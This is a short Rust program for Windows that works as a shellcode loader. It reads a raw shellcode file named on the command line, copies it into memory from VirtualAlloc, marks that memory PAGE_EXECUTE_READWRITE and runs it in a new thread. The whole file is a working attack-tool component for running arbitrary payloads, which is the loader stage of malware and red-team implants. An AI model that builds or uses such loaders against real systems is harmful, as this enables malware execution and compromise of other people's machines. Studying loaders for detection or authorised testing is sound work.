use std::fs::{File, OpenOptions};
use std::io::{self, Read, Error};
use std::{ptr, env};
use std::process::exit;
use colored::Colorize;
use windows::Win32::{
    Foundation::{CloseHandle, GetLastError},
    System::{
        Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS},
        Threading::{CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS},
    },
};

fn read_shellcode(path: &str) -> Result<Vec<u8>, Error>{
    let mut shellcode_bytes = match File::open(path){
        Ok(shellcode_bytes) => shellcode_bytes,
        Err(e) => return Err(e)
    };

    let mut payload_vec = Vec::new();
    shellcode_bytes.read_to_end(&mut payload_vec);
    
    Ok(payload_vec)
}

fn copy_shellcode(payload: *const u8, mem_address: *mut u8, plenght: usize){
    unsafe{
         ptr::copy(payload, mem_address, plenght);
    }
}
fn main(){
    // collect args

    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        println!("{}: Invalid amount of arguments", "Error".red());
        println!("{}: cargo run <path-to-shellcode/*.bin", "Example".blue());
        exit(1);
    }

    // read shellcode
    let payload_vec = read_shellcode(&args[1]).expect("Failed to read shellcode.");

    unsafe {
        // Allocating memory
        let l_address = VirtualAlloc(Some(ptr::null_mut()), payload_vec.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if l_address.is_null(){
            println!("[-] VirtualAlloc failed with error {}", GetLastError().0);
        }

        println!("[+] Memory Allocated at {:p}", &l_address);
        
        //copy shellcode
        copy_shellcode(payload_vec.as_ptr(), l_address as *mut u8, payload_vec.len());

        // Modify memory protection
        VirtualProtect(l_address, payload_vec.len(), PAGE_EXECUTE_READWRITE, &mut PAGE_PROTECTION_FLAGS(0));

        // Create a local thread
        let h_thread = CreateThread(Some(ptr::null()), 0, Some(std::mem::transmute(l_address)), Some(ptr::null()), THREAD_CREATION_FLAGS(0), Some(ptr::null_mut())).unwrap();
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
    };

    println!("[!] Success! Executed shellcode."); 
}
